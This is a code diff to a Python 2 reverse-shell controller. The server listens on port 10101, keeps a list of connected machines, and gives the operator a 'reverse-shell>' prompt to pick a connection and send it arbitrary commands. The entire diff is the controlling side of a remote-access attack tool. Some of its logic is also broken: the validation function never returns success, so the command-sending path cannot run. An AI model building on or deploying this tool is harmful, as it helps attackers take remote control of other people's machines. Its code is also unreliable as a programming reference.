@@ -1,4 +1,5 @@
 import socket
+import threading
 
 
 class Server(object):
@@ -11,37 +12,70 @@ class Server(object):
         self.sckt.bind(("", 10101))
         self.sckt.listen(5)
 
+    def start(self):
+        self.accept_connections()
+        self.show_prompt()
+
     # should be multi-threaded
-    def accept_connection(self):
+    def accept_connections(self):
         connection, address = self.sckt.accept()
         self.connections.append(connection)
         self.addresses.append(address)
-        #self.accept_connection()
+
+    def show_prompt(self):
+        while True:
+            command = raw_input("\nreverse-shell> ")
+            if command == "quit":
+                break
+            elif command == "list":
+                self.show_connections()
+            elif command[:6] == "select":
+                valid = self.error_check_for_send_commands(command[7:])
+                if valid:
+                    self.send_commands(int(command[7:]))
+            else:
+                print("-- command not recognized")
 
     def remove_connection(self, index):
         del self.addresses[index]
         del self.connections[index]
 
     def show_connections(self):
-        print("---------- Connections ----------")
+        print("\n---------- Connections ----------")
         for index, address in enumerate(self.addresses):
-            print(str(index) + "     " + address[0] + "     " + str(address[1]))
-        command = raw_input(">> ")
-        if command[:6] == "select":
-            if int(command[7:]) < len(self.addresses):
-                self.send_commands(int(command[7:]))
+            try:
+                self.connections[index].send("?")
+                self.connections[index].recv(1024)
+            except:
+                self.remove_connection(index)
+                continue
+            print(str(index) + (" " * 10) + address[0] + (" " * 10) + str(address[1]))
 
     def send_commands(self, index):
         while True:
-            # show IP on raw input?
-            command = raw_input(">> ")
-            if command == "quit":
+            command = raw_input(self.addresses[index][0] + ">> ")
+            if command == "done":
                 break
-            if len(command) > 0:
+            elif len(command) > 0:
                 self.connections[index].send(command)
                 response = str(self.connections[index].recv(1024))
                 print(response)
         self.show_connections()
+
+    def error_check_for_send_commands(self, argument):
+        if not argument.isdigit():
+            print("-- " + argument + " is not a number")
+            return False
+        index = int(argument)
+        if self.connections[index] is None:
+            print("-- connection " + str(index) + " is no longer available")
+            print("-- use command 'list' to see all available connections")
+            self.remove_connection(index)
+            return False
+        elif index >= len(self.connections):
+            print("-- connection " + str(index) + " is not an active connection")
+            print("-- use command 'list' to see all available connections")
+            return False
 
     def close_connections(self):
         for connection in self.connections:
@@ -51,8 +85,7 @@ class Server(object):
 
 def main():
     server = Server()
-    server.accept_connection()
-    server.send_commands(0)
+    server.start()
 
 
 if __name__ == "__main__":
